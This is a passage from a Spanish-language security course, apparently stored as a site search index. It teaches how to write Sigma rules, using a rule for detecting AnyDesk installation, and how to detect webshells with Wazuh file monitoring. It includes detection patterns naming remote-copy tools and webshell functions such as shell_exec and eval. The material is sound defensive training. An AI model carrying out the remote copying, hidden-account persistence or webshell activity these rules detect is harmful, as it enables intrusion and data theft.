cidr). Actualmente, el \u00fanico modificador de tipo utilizable es <code>re</code>, que es compatible con las consultas de Elasticsearch para manejar el valor como una expresi\u00f3n regular.</p> <p>Para las condition, esto se basa en los nombres establecidos para las detection, tal como selection y filter, y determinar\u00e1 la especificaci\u00f3n de la regla basada en una expresi\u00f3n seleccionada. Algunas de las expresiones admitidas son</p> <ul> <li>AND/OR l\u00f3gico</li> <li>1/todos de b\u00fasqueda-identificador</li> <li>1/todos</li> <li>not</li> </ul> </li> </ul> <p>Un ejemplo de estos valores condicionales puede verse en el siguiente extracto de la regla Copia remota de archivos, donde la detecci\u00f3n busca cualquier de estas herramientas: <code>scp</code>, <code>rsync</code> o <code>sftp</code> y con cualquier de estos filtros <code>@</code>o <code>:</code>.</p> <p>Remote_File_Copy.yml<pre><code>detection:\n  tools:\n         - 'scp'\n         - 'rsync'\n         - 'sftp'\n  filter:\n         - '@'\n         - ':'\n  condition: tools and filter\n</code></pre> Esto podr\u00eda detectar comandos que usen SCP, RSYNC o SFTP y que contengan caracteres t\u00edpicos en rutas o direcciones remotas, como user@host: que es com\u00fan en SCP o RSYNC.</p> <p>Ejemplo de l\u00ednea de comando detectada:</p> <pre><code>scp user@remotehost:/path/to/file /local/dir\n</code></pre> <p>Otro ejemplo para mostrar una combinaci\u00f3n de las expresiones condicionales se puede ver en el siguiente extracto de la regla Run Once Persistence Registry Event, donde la detecci\u00f3n trata de buscar valores en el mapa que empiecen y terminen con varios valores del registro, a la vez que filtra las entradas de Google Chrome y Microsoft Edge que levantar\u00edan alertas de falsos positivos.</p> <p>Registry_Event_RunOnce_Persistence.yml<pre><code>detection:\n  selection:\n    TargetObject|startswith: 'HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components'\n    TargetObject|endswith: '\\StubPath'\n  filter_chrome:\n    Details|startswith: '\"C:\\Program Files\\Google\\Chrome\\Application\\'\n    Details|endswith: '\\Installer\\chrmstp.exe\" --configure-user-settings --verbose-logging --system-level'\n  filter_edge:\n    Details|startswith:\n    - '\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\'\n    - '\"C:\\Program Files\\Microsoft\\Edge\\Application\\'\n    Details|endswith: '\\Installer\\setup.exe\" --configure-user-settings --verbose-logging --system-level --msedge \n    --channel=stable'\n  condition: selection and not 1 of filter_*\n</code></pre> Esta regla busca detectar modificaciones en claves espec\u00edficas del registro de Windows que puedan indicar cambios en la configuraci\u00f3n de programas instalados, pero excluye intencionadamente los eventos leg\u00edtimos generados por instaladores oficiales de Chrome o Edge (porque esos tambi\u00e9n modifican esas claves pero no son maliciosos).</p> <p>Responde a las preguntas</p> <ol> <li>\u00bfQu\u00e9 nivel de estado puede llevar a falsos resultados o ser ruidoso pero tambi\u00e9n puede identificar eventos interesantes?</li> <li>Las reglas de detecci\u00f3n poseen dos elementos principales: ____ y las expresiones condicionales.</li> <li>\u00bfQu\u00e9 dos estructuras de datos se usan para los identificadores de b\u00fasqueda?</li> </ol>"},{"location":"Gestion_incidentes/sigma/#escritura-de-reglas-y-conversion","title":"Escritura de reglas y conversi\u00f3n","text":"<p>Despu\u00e9s de repasar la sintaxis b\u00e1sica de las reglas Sigma, es crucial entender c\u00f3mo escribirlas bas\u00e1ndose en una investigaci\u00f3n de amenazas. Como analista SOC, se debe pasar por el proceso de reflexi\u00f3n de desarrollar la detecci\u00f3n y escribir las reglas apropiadas para nuestro entorno. </p>"},{"location":"Gestion_incidentes/sigma/#escenario","title":"Escenario","text":"<p>Los administradores conf\u00edan en las herramientas remotas para asegurarse de que los dispositivos est\u00e1n configurados, parcheados y mantenidos. Sin embargo, el SOC Manager acaba de recibir y compartir informaci\u00f3n sobre c\u00f3mo AnyDesk, una herramienta remota leg\u00edtima, puede descargarse e instalarse silenciosamente en la m\u00e1quina de un usuario utilizando la el archivo descirot en la imagen de abajo. (Fuente: TheDFIRReport).</p> <p></p> <p>Como analista SOC, se nos ha encargado que analice la informaci\u00f3n y escribamos una regla Sigma para detectar la instalaci\u00f3n de AnyDesk en dispositivos Windows.</p>"},{"location":"Gestion_incidentes/sigma/#paso-1-analisis-de-intel","title":"Paso 1: An\u00e1lisis de Intel","text":"<p>La intel compartida nos muestra mucha informaci\u00f3n y comandos para descargar e instalar AnyDesk. Un adversario podr\u00eda empaquetar esto en un ejecutable malicioso enviado a un usuario desprevenido a trav\u00e9s de un correo electr\u00f3nico de phishing. Podemos empezar a seleccionar valores que ser\u00edan importantes para detectar cualquier caso de instalaci\u00f3n.</p> <ul> <li>URL de origen: Marca la fuente de descarga del software, especificada por la variable $url.</li> <li>Archivo de destino: El adversario buscar\u00eda identificar un directorio de destino para la descarga. Esto est\u00e1 marcado por la variable $file.</li> <li>Comando de instalaci\u00f3n: De la inteligencia, podemos ver que varias instancias de CMD.exe est\u00e1n siendo usadas para instalar y establecer una contrase\u00f1a de usuario por el script. A partir de esto, podemos elegir los atributos de instalaci\u00f3n como <code>--install</code>, <code>--start-with-win</code> y <code>--silent</code>.</li> </ul> <p>Otros datos esenciales de la inteligencia ser\u00edan:</p> <ul> <li>Persistencia del adversario: El adversario tratar\u00eda de mantener el acceso a la m\u00e1quina de la v\u00edctima. En este caso, crear\u00eda una cuenta de usuario <code>oldadministrator</code> y le dar\u00eda privilegios elevados para ejecutar otras tareas.</li> <li>Edici\u00f3n del registro: Tambi\u00e9n podemos identificar la edici\u00f3n del registro, donde el usuario a\u00f1adido se a\u00f1ade a una lista de usuarios <code>SpecialAccounts</code>.</li> </ul> <p>Con esta informaci\u00f3n, podemos evaluar la creaci\u00f3n de una regla que ayude a detectar cu\u00e1ndo se ha producido una instalaci\u00f3n.</p>"},{"location":"Gestion_incidentes/sigma/#paso-2-identificacion-de-regla","title":"Paso 2: Identificaci\u00f3n de regla","text":"<p>Podemos empezar a construir nuestra regla rellenando las secciones Title y Description, dada la informaci\u00f3n de que estamos buscando una instalaci\u00f3n de la herramienta remota AnyDesk. Establezcamos tambi\u00e9n el estado como <code>experimental</code>, ya que esta regla se probar\u00e1 internamente.</p> Process_Creation_AnyDesk_Installation.yml<pre><code>title: AnyDesk Installation\nstatus: experimental\ndescription: AnyDesk Remote Desktop installation can be used by attacker to gain remote access.\n</code></pre>"},{"location":"Gestion_incidentes/sigma/#paso-3-fuente-de-logs","title":"Paso 3: Fuente de logs","text":"<p>Seg\u00fan nuestra informaci\u00f3n, los dispositivos Windows ser\u00edan nuestro objetivo v\u00edctima. Windows Eventlog y Sysmon proporcionan eventos como la creaci\u00f3n de procesos y la creaci\u00f3n de archivos. Nuestro caso se centra en la creaci\u00f3n de un proceso de instalaci\u00f3n, por lo que nuestra categor\u00eda logsource es <code>process_creation</code>.</p> Process_Creation_AnyDesk_Installation.yml<pre><code>logsource:\n    category: process_creation\n    product: windows\n</code></pre>"},{"location":"Gestion_incidentes/sigma/#paso-4-detection-description","title":"Paso 4: Detection Description","text":"<p>La secci\u00f3n detection de nuestra regla es la parte esencial. La informaci\u00f3n derivada de la inteligencia definir\u00e1 lo que necesitamos detectar en nuestro entorno. Para la instalaci\u00f3n de AnyDesk, anotamos los comandos de instalaci\u00f3n que usar\u00eda el adversario que contiene las cadenas: <code>install</code>, y <code>start-with-win</code>. Por lo tanto, podemos escribir nuestros identificadores de b\u00fasqueda como se indica a continuaci\u00f3n con los modificadores <code>contains</code> y <code>all</code> para indicar que la regla coincidir\u00e1 con todos esos valores.</p> <p>Adem\u00e1s, podemos incluir la b\u00fasqueda del directorio actual desde el que se ejecutar\u00e1n los comandos, <code>C:\\ProgramData\\AnyDesk.exe</code></p> <p>Para nuestra expresi\u00f3n de condici\u00f3n, esto eval\u00faa la selecci\u00f3n de nuestra detecci\u00f3n.</p> Process_Creation_AnyDesk_Installation.yml<pre><code>detection:\n    selection:\n        CommandLine|contains|all: \n            - '--install'\n            - '--start-with-win'\n        CurrentDirectory|contains:\n            - 'C:\\ProgramData\\AnyDesk.exe'\n    condition: selection\n</code></pre>"},{"location":"Gestion_incidentes/sigma/#paso-5-metadatos-de-la-regla","title":"Paso 5: Metadatos de la regla","text":"<p>Despu\u00e9s de a\u00f1adir los pedazos de informaci\u00f3n necesarios y vitales a nuestra regla, podemos a\u00f1adir otra informaci\u00f3n \u00fatil a bajo nivel, etiquetas, referencias y falsos positivos. Podemos hacer referencia a la t\u00e1ctica MITRE ATT&amp;CK Command and Control y su correspondiente t\u00e9cnica T1219 para las etiquetas.</p> <p>Con esto, tenemos nuestra regla, que ahora podemos convertir a la consulta SIEM de nuestra elecci\u00f3n y probar la detecci\u00f3n.</p> Process_Creation_AnyDesk_Installation.yml<pre><code>falsepositives:\n    - Legitimate deployment of AnyDesk\nlevel: high\nreferences:\n    - https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20\ntags:\n    - attack.command_and_control\n    - attack.t1219\n</code></pre>"},{"location":"Gestion_incidentes/sigma/#conversion-de-regla","title":"Conversi\u00f3n de regla","text":"<p>Las reglas Sigma necesitan ser convertidas al SIEM apropiado que est\u00e9 siendo utilizado para almacenar todos los logs. Usando la regla que hemos escrito anteriormente, ahora vamos a aprender a utilizar las herramientas sigmac y uncoder.io para convertirlas en consultas ElasticSearch y Splunk.</p>"},{"location":"Gestion_incidentes/sigma/#sigmac","title":"Sigmac","text":"<p>Sigmac es una herramienta escrita en Python que convierte las reglas Sigma comparando los valores de los campos de origen del registro de detecci\u00f3n con los campos apropiados del backend SIEM. Como parte del repositorio de Sigma (se recomienda clonar el repositorio para obtener la herramienta y todas las reglas disponibles publicadas por el equipo de Sigma), esta herramienta permite una conversi\u00f3n r\u00e1pida y sencilla de las reglas Sigma desde la l\u00ednea de comandos. A continuaci\u00f3n se muestra un fragmento de c\u00f3mo utilizar la herramienta a trav\u00e9s de su comando de ayuda, y mostraremos la sintaxis b\u00e1sica de uso de la herramienta convirtiendo la regla AnyDesk que hemos escrito a la consulta Splunk.</p> <p>Nota</p> <p>Sigmac qued\u00f3 obsoleto a finales de 2022, y sus creadores se han centrado en <code>sigma-cli</code> que tambi\u00e9n es capaz de realizar conversi\u00f3n de reglas entre otras cosas.</p> <p></p> <p>Las principales opciones que se pueden utilizar son:</p> <ul> <li>-t: Establece el backend SIEM objetivo para el que desea obtener consultas (Elasticsearch, Splunk, QRadar, ElastAlert).</li> <li>-c: Establece el archivo de configuraci\u00f3n utilizado para la conversi\u00f3n. El archivo gestiona las asignaciones de campos entre la regla y el entorno SIEM de destino, garantizando que los campos necesarios sean correctos para realizar investigaciones en su entorno.</li> <li>--opci\u00f3n backend: Permite pasar un archivo de configuraci\u00f3n de backend o modificaciones individuales que dictan las opciones de alerta para el entorno SIEM de destino. Por ejemplo, en ElasticSearch, podemos especificar propiedades de campo espec\u00edficas para que sean nuestro keyword_field primario en el que buscar, como los campos que terminan en <code>.keyword</code> o <code>.security</code> a continuaci\u00f3n:</li> </ul> <p>Sigmac ElasticSearch Conversion<pre><code>python3.9 sigmac -t es-qs -c tools/config/winlogbeat.yml --backend-option keyword_field=\".keyword\" --backend-option analyzed_sub_field_name=\".security\" ../rules/windows/sysmon/sysmon_accessing_winapi_in_powershell_credentials_dumping.yml\n</code></pre> Puede encontrar m\u00e1s informaci\u00f3n en la documentaci\u00f3n de Sigmac. Podemos convertir nuestra regla de instalaci\u00f3n de AnyDesk en una alerta de Splunk como se muestra a continuaci\u00f3n:</p> <p>Sigmac Splunk Conversion<pre><code>python3.9 sigmac -t splunk -c splunk-windows Process_Creation_AnyDesk_Installation.yml\n</code></pre> Existe una biblioteca de Python que hace las veces de reemplazo de Sigmac, pySigma</p>"},{"location":"Gestion_incidentes/sigma/#uncoderio","title":"Uncoder.io","text":"<p>Uncoder.io es un conversor Sigma en l\u00ednea para numerosas plataformas SIEM y EDR. Es f\u00e1cil de usar, ya que le permite copiar su regla Sigma en la plataforma y seleccionar su aplicaci\u00f3n backend preferida para la traducci\u00f3n. Tenga en cuenta que, con las \u00faltimas actualizaciones, es necesario crear una cuenta gratuita en el sitio web uncoder.io.</p> <p>Podemos copiar nuestra regla y convertirla en diferentes consultas de nuestra elecci\u00f3n.</p>"},{"location":"Gestion_incidentes/wazuh/","title":"Detecci\u00f3n de webshells con Wazuh","text":""},{"location":"Gestion_incidentes/wazuh/#que-es-wazuh","title":"\u00bfQu\u00e9 es Wazuh?","text":"<p>Wazuh, en palabras de su creador, el espa\u00f1ol Santiago Basset, es una proyecto open source que trata de prevenir, detectar y responder a amenazas.</p> <p>T\u00e9cnicamente podr\u00eda considerarse un HIDS (Host Intrusion Detection System). Estos dispositivos usualmente centraban la importancia en los eventos en la red. Sin embargo esta es una tendencia cambiante, como vemos en este gr\u00e1fico de ejemplo de MITRE:</p> <p></p> <p>As\u00ed pues, Wazuh quiz\u00e1s se acerque m\u00e1s a un XDR o un SIEM.</p> <p>Su objetivo principal es monitorizar la seguridad de los sistemas, detectar amenazas, responder ante incidentes y facilitar el cumplimiento normativo, todo desde una \u00fanica consola centralizada.</p> <p>Wazuh se ha convertido en una soluci\u00f3n ampliamente adoptada por su versatilidad, escalabilidad y transparencia, y es utilizada tanto en entornos empresariales como acad\u00e9micos.</p>"},{"location":"Gestion_incidentes/wazuh/#historia-y-evolucion","title":"\ud83e\uddec Historia y evoluci\u00f3n","text":"<p>Wazuh naci\u00f3 como un fork de OSSEC, un proyecto veterano de HIDS, al que se le a\u00f1adieron mejoras sustanciales en escalabilidad, arquitectura modular, interfaz gr\u00e1fica, soporte a tecnolog\u00edas modernas y extensibilidad. Con el tiempo, Wazuh evolucion\u00f3 hacia una soluci\u00f3n integral de detecci\u00f3n y respuesta que va mucho m\u00e1s all\u00e1 del simple monitoreo de logs o archivos.</p>"},{"location":"Gestion_incidentes/wazuh/#arquitectura-de-wazuh","title":"\ud83e\uddf1 Arquitectura de Wazuh","text":"<p>Wazuh sigue una arquitectura cliente-servidor (o mejor dicho, agente-m\u00e1nager-dashboard), compuesta por varios componentes clave:</p>"},{"location":"Gestion_incidentes/wazuh/#1-agentes-wazuh","title":"1. Agentes Wazuh","text":"<p>Instalados en sistemas finales (Windows, Linux, macOS), los agentes recogen:</p> <ul> <li>Logs del sistema y aplicaciones</li> <li>Actividad de red y procesos</li> <li>Cambios en archivos (FIM)</li> <li>Eventos de seguridad (fallos de autenticaci\u00f3n, escalada de privilegios, etc.)</li> </ul>"},{"location":"Gestion_incidentes/wazuh/#2-manager-wazuh","title":"2. Manager Wazuh","text":"<p>Es el n\u00facleo del sistema:</p> <ul> <li>Recibe y analiza los datos de los agentes</li> <li>Aplica reglas de correlaci\u00f3n</li> <li>Genera alertas de seguridad</li> <li>Ejecuta respuestas activas si se configuran</li> </ul>"},{"location":"Gestion_incidentes/wazuh/#3-wazuh-indexer-basado-en-opensearchelasticsearch","title":"3. Wazuh Indexer (basado en OpenSearch/Elasticsearch)","text":"<p>Almacena y permite consultar grandes vol\u00famenes de datos estructurados, como eventos y alertas de seguridad, mediante b\u00fasquedas r\u00e1pidas y complejas.</p>"},{"location":"Gestion_incidentes/wazuh/#4-wazuh-dashboard","title":"4. Wazuh Dashboard","text":"<p>Interfaz web basada en Kibana/OpenSearch Dashboards:</p> <ul> <li>Visualizaci\u00f3n de alertas, logs, informes y cumplimiento</li> <li>Gesti\u00f3n de pol\u00edticas de seguridad</li> <li>Seguimiento de incidentes en tiempo real</li> </ul>"},{"location":"Gestion_incidentes/wazuh/#capacidades-clave-de-wazuh","title":"\ud83e\udde0 Capacidades clave de Wazuh","text":"Funci\u00f3n Descripci\u00f3n \ud83d\udd0d HIDS Detecci\u00f3n basada en host de archivos modificados, nuevos procesos, cambios en el sistema, etc. \ud83d\udcd1 FIM (File Integrity Monitoring) Monitorizaci\u00f3n de archivos cr\u00edticos del sistema o aplicaciones web (muy \u00fatil contra webshells). \ud83d\udcdc An\u00e1lisis de logs Ingesta y an\u00e1lisis de logs de sistemas, aplicaciones, dispositivos de red, servicios cloud (AWS, Azure, GCP). \ud83d\udee1\ufe0f Detecci\u00f3n de amenazas Reglas de correlaci\u00f3n que detectan patrones de ataque, como escaladas de privilegios, movimiento lateral o conexiones sospechosas. \ud83e\udd16 Respuestas activas Scripts autom\u00e1ticos para bloquear IPs, cerrar procesos o modificar configuraciones ante incidentes. \ud83c\udfdb\ufe0f Cumplimiento normativo M\u00f3dulos y plantillas para PCI-DSS, GDPR, HIPAA, NIST 800-53, etc., con informes automatizados. \u2601\ufe0f Integraci\u00f3n cloud y contenedores Integraci\u00f3n con Kubernetes, Docker, AWS CloudTrail, Azure logs, etc. para visibilidad en entornos h\u00edbridos y nativos de la nube. \ud83e\udde9 Extensibilidad Uso de decoders, reglas personalizadas, integraciones con VirusTotal, Suricata, Zeek, TheHive, etc."},{"location":"Gestion_incidentes/wazuh/#casos-de-uso-tipicos","title":"\ud83c\udfaf Casos de uso t\u00edpicos","text":"<ul> <li>Monitorizaci\u00f3n de seguridad de endpoints (EDR/HIDS)</li> <li>Detecci\u00f3n de accesos no autorizados y malware</li> <li>Detecci\u00f3n de webshells en servidores web (con FIM + an\u00e1lisis de logs + reglas personalizadas)</li> <li>Cumplimiento normativo automatizado</li> <li>Integraci\u00f3n con herramientas de respuesta a incidentes (SOAR, TheHive, MISP)</li> </ul>"},{"location":"Gestion_incidentes/wazuh/#web-shells","title":"Web shells","text":"<p>Los cibercriminales utilizan diferentes t\u00e9cnicas para conseguir la persistencia en un sistema previamente comprometido. Una de estas t\u00e9cnicas son las web shells.</p>"},{"location":"Gestion_incidentes/wazuh/#que-son-las-webshells","title":"\u00bfQu\u00e9 son las webshells?","text":"<p>Son scripts web que permiten a los atacantes acceso remoto sin restricciones. Puede pasar que un atacante logra comprometer un servidor, consiguiendo el acceso inicial al servicio web mediante alguna t\u00e9cnica ya conocida (SQLi, XSS, RFI...).</p> <p>Con este compromiso inicial, se puede intentar realizar la inyecci\u00f3n de una web shell en el directorio del servidor y que constituir\u00e1 un backdoor que dar\u00e1 paso a actividades post-explotaci\u00f3n (ejecuci\u00f3n de comandos, exfiltraci\u00f3n de informaci\u00f3n, infecci\u00f3n de malware...).</p> <p></p> <p>La mayor\u00eda de los web shells siguen los mismos principios de dise\u00f1o y e intenciones. Normalmente suelen estar escritos en lenguajes soportados por los servidores web: PHP, ASP, ASP.NET, Perl, Python...</p>"},{"location":"Gestion_incidentes/wazuh/#indicadores-comunes-de-los-web-shells","title":"Indicadores comunes de los web shells","text":"<ul> <li>Archivos subidos o modificados recientemente: los atacantes suelen subir sus web shells en los directorios utilizados por los servidores web o modificar archivos ya presentes en ellos. Disonancias en las fechas de modificaci\u00f3n pueden ser un indicativo.</li> <li>Conexiones de red inusuales: las web shell puede que tengan que poner determinados puertos a la escucha para establecer reverse shells o shells inversas hacia los atacantes. Esto producir\u00e1 tr\u00e1fico inusual (TCP o UDP), que puede ser un indicador de compromiso.</li> <li>Configuraciones extra\u00f1as/err\u00f3neas y cabeceras modificadas: cabeceras cl\u00e1siscas de las peticiones HTTP son user-agent o referer. Los atacantes pueden realizar la modificaci\u00f3n de estas cabeceras de tal forma que se intente una ejecuci\u00f3n de comandos mediante ellas.</li> <li>T\u00e9cnicas de ofuscaci\u00f3n: puede que el atacante emplee t\u00e9cnicas de codificaci\u00f3n, compresi\u00f3n o sustituci\u00f3n para intentar ser detectado por los sitemas de seguridad.</li> </ul>"},{"location":"Gestion_incidentes/wazuh/#manos-a-la-obra-configuracion-del-laboratorio","title":"Manos a la obra, configuraci\u00f3n del laboratorio","text":"<p>Para este laboratorio utilizaremos AWS, por la versatilidad que nos ofrece y as\u00ed deshacernos de los problemas de infraestructa a los que pueda limitarnos nuestra m\u00e1quina. Se van a utilizar 4 m\u00e1quinas:</p> <ol> <li>Amazon Linux 2: para instalar el servidor de Wazuh.</li> <li>Ubuntu: como v\u00edctima endpoint que est\u00e1 ejecutando un agente de Wazuh. Correr\u00e1 un servidor Apache para aplicaciones PHP.</li> <li>Windows Server 2022: otra v\u00edctima endpoint ejecutadno otro agente de Wazuh. Correr\u00e1 un servidor IIS para aplicaciones ASP.NET.</li> <li>Debian: como m\u00e1quina atacante.</li> </ol>"},{"location":"Gestion_incidentes/wazuh/#wazuh-server-en-amazon-linux-2","title":"Wazuh server en Amazon Linux 2","text":"<p>La instalaci\u00f3n del servidor de Wazuh o Wazuh manager se puede realizar siguiendo este sencillo tutorial.</p>"},{"location":"Gestion_incidentes/wazuh/#agente-wazuh-en-ubuntu-2204","title":"Agente Wazuh en Ubuntu 22.04","text":"<p>Los pasos vienen detallados aqu\u00ed</p> <p>Atenci\u00f3n</p> <pre><code>Elegid la pesta\u00f1a ***APT***, que es la que os dar\u00e1 las indicaciones para realizar las acciones con el gestor de paquetes correspondiente.\n</code></pre>"},{"location":"Gestion_incidentes/wazuh/#agente-de-wazuh-en-windows-server-2022","title":"Agente de Wazuh en Windows Server 2022","text":"<p>En este caso las instrucciones est\u00e1n aqu\u00ed y os dar\u00e1 la opci\u00f3n, en las pesta\u00f1as, de elegir una instalaci\u00f3n gr\u00e1fica o por l\u00ednea de comandos.</p> <p>Atenci\u00f3n</p> <pre><code>Recordad poner como IP de Wazuh manager la de vuestro server de Wazuh.\n</code></pre>"},{"location":"Gestion_incidentes/wazuh/#servidor-web-apache-en-endpoint-ubuntu","title":"Servidor web Apache en endpoint Ubuntu","text":"<p>Pasos a seguir:</p> <ol> <li> <p>Instalar Apache:</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install apache2\n</code></pre> </li> <li> <p>Instalar PHP 8.1 para poder correr aplicaciones PHP</p> <pre><code>$ sudo apt-get install --no-install-recommends php8.1\n</code></pre> <p>As\u00ed evitaremos instalar paquetes adicionales.</p> </li> <li> <p>Para verificar la instalaci\u00f3n podemos acceder a la URL: <code>http://IP_UBUNTU_ENDPOINT</code>y nos mostrar\u00e1 la p\u00e1gina por defecto de Apache.</p> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#servidor-web-iis-en-endpoint-windows-server","title":"Servidor web IIS en endpoint Windows Server","text":"<p>Para proceder con esta instalaci\u00f3n:</p> <ol> <li> <p>En el men\u00fa de inicio de Windows, escribimos <code>appwiz.cpl</code> y le decimos Turn Windows features on or off:</p> <p></p> </li> <li> <p>En Server Roles instalamos Web Server (IIS) conm, al menos, las siguientes funciones:</p> <p></p> </li> <li> <p>Para verificar la instalaci\u00f3n accedemos a la URL: <code>http://IP_WINDOWS_ENDPOINT</code></p> </li> </ol> <p>\u00a1Atenci\u00f3n, importante!</p> <p>En la comunicaci\u00f3n entre los agentes y el servidor intervienen distintos puertos. La forma f\u00e1cil de evitaros todo problema es a\u00f1adir una regla de seguridad a todas las m\u00e1quinas donde se permite cualquier conexi\u00f3n entrante (TCP/UDP, cualquier puerto) desde la red 172.31.0.0/16. </p> <p>Esto no supone un gran problema de seguridad puesto que es el segmento de red privado que nos asigna AWS Academy por defecto. En esencia lo que hacemos es dejar que todas las m\u00e1quinas dentro de esa red se comuniquen sin cortapisas.</p>"},{"location":"Gestion_incidentes/wazuh/#escenario-hipotetico","title":"Escenario hipot\u00e9tico","text":"<p>El endpoint Ubuntu corre un Apache con PHP instalado y el endpoint Windows Server corre un servidor web IIS, capaz de interpretar c\u00f3digo ASP.NET.</p> <p>Puesto que las web shells se consideran malware post-explotaci\u00f3n, hemos de asumir que el atcante ya posee acceso inicial a los endpoints. Lo que el atacante desea conseguir es la persistencia en el sistema comprometido con el fin de llevar a cabo estas labores de  post-explotaci\u00f3n.</p>"},{"location":"Gestion_incidentes/wazuh/#tecnicas-de-deteccion","title":"T\u00e9cnicas de detecci\u00f3n","text":"<p>Utilizaremos distintas capacidades de Wazuh para detectar la presencia de web shells en PHP o ASP.NET.</p>"},{"location":"Gestion_incidentes/wazuh/#integridad-de-ficheros","title":"Integridad de ficheros","text":"<p>Utilizaremos FIM (File Integritiy Monitorint) para deteta rla creaci\u00f3n y modificaci\u00f3n de archivos que contengan web shells.</p> <p>El m\u00f3dulo FIM de Wazuih puede detectar, casi en tiempo real, cambios en los archivos accesibles via web y de esta forma alertar a los administradores.</p> <p>Usaremos este m\u00f3dulo para detectar cuando se han creado o odificado archivos en <code>/var/wwww/html</code>y en <code>C:\\inetpub\\wwwroot</code>, directorios raiz por defecto en Ubuntu y Windows respectivamente.</p> <p>Adem\u00e1s, FIM escanea los contenidos de los archivos para monitorizar la aparci\u00f3n de firmas de web shells cuando los archivos se modifican.</p>"},{"location":"Gestion_incidentes/wazuh/#configuracion-de-ubuntu","title":"Configuraci\u00f3n de Ubuntu","text":"<ol> <li> <p>A\u00f1adir la siguiente configuraci\u00f3n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p> <p><pre><code>&lt;directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\"&gt;/var/www/html&lt;/directories&gt;\n</code></pre> Esto detecta los cambios en el directorio <code>/var/www/html</code>.</p> </li> <li> <p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-agent\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#configuracion-de-windows","title":"Configuraci\u00f3n de Windows","text":"<ol> <li> <p>A\u00f1adir la siguiente configuraci\u00f3n al agente de Wazu en el archivo <code>C:\\Program Files (x86)\\ossec-agent\\ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p> <pre><code>&lt;directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\"&gt;C:\\inetpub\\wwwroot&lt;/directories&gt;\n</code></pre> </li> <li> <p>Corriendo una terminal de Powershell como administrador, reinicia el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>&gt; Restart-Service -Name wazuh\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#configuracion-del-servidor-de-wazuh","title":"Configuraci\u00f3n del servidor de Wazuh","text":"<ol> <li> <p>Crear un archivo de reglas personalizado <code>reglas_webshell.xml</code> en el directorio <code>/var/ossec/etc/rules/</code> y colocar en \u00e9l las siguientes reglas:</p> reglas_Webshell.xml<pre><code>&lt;group name=\"linux, webshell, windows,\"&gt;\n&lt;!-- Esta regla detecta la creaci\u00f3n de archivos --&gt;\n&lt;rule id=\"100500\" level=\"12\"&gt;\n&lt;if_sid&gt;554&lt;/if_sid&gt;\n&lt;field name=\"file\" type=\"pcre2\"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$&lt;/field&gt;\n&lt;description&gt;[File creation]: Possible web shell scripting file ($(file)) created&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta la modificaci\u00f3n de archivos --&gt;\n&lt;rule id=\"100501\" level=\"12\"&gt;\n&lt;if_sid&gt;550&lt;/if_sid&gt;\n&lt;field name=\"file\" type=\"pcre2\"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$&lt;/field&gt;    \n&lt;description&gt;[File modification]: Possible web shell content added in $(file)&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta la modificaci\u00f3n de archivos con firmas asociadas a web shells de PHP --&gt;\n&lt;rule id=\"100502\" level=\"15\"&gt;\n&lt;if_sid&gt;100501&lt;/if_sid&gt;\n&lt;field name=\"changed_content\" type=\"pcre2\"&gt;(?i)passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|show_source|proc_open|pcntl_exec|execute|WScript.Shell|WScript.Network|FileSystemObject|Adodb.stream&lt;/field&gt;\n&lt;description&gt;[File Modification]: File $(file) contains a web shell&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar Wazuh manager para aplicar la configuraci\u00f3n de los cambios</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"Gestion_incidentes/wazuh/#explicacion-de-las-reglas-personalizadas","title":"Explicaci\u00f3n de las reglas personalizadas","text":"<ul> <li> <p><code>id=\"100500\"</code>: ID \u00fanico de esta regla.</p> </li> <li> <p><code>level=\"12\"</code>: Severidad alta. El m\u00e1ximo es 15.</p> </li> <li> <p><code>&lt;if_sid&gt;554&lt;/if_sid&gt;</code>: Solo se aplica si antes se ha activado la regla con ID 554 (esta regla base detecta creaci\u00f3n de archivos).</p> </li> <li> <p><code>&lt;field name=\"file\" type=\"pcre2\"&gt;...</code>: Aplica un regex (compatible con PCRE2) sobre el campo file. Busca archivos con extensiones t\u00edpicas de web shells:</p> <p><code>.php, .asp, .jsp, .cshtml, .vbhtml, etc.</code></p> </li> <li> <p><code>$(file)</code>: Variable que se sustituye con el nombre del archivo real.</p> </li> <li> <p><code>&lt;mitre&gt;</code>: Indica t\u00e9cnicas MITRE ATT&amp;CK asociadas:</p> <ul> <li>T1105 \u2013 Ingress Tool Transfer: transferencia de herramientas maliciosas al sistema.</li> <li>T1505 \u2013 Server Software Component: modificaci\u00f3n maliciosa de componentes del servidor (como web shells).</li> </ul> </li> </ul> <p>\ud83d\udccc Esta regla detecta que se ha creado un archivo sospechoso que podr\u00eda ser un web shell.</p> 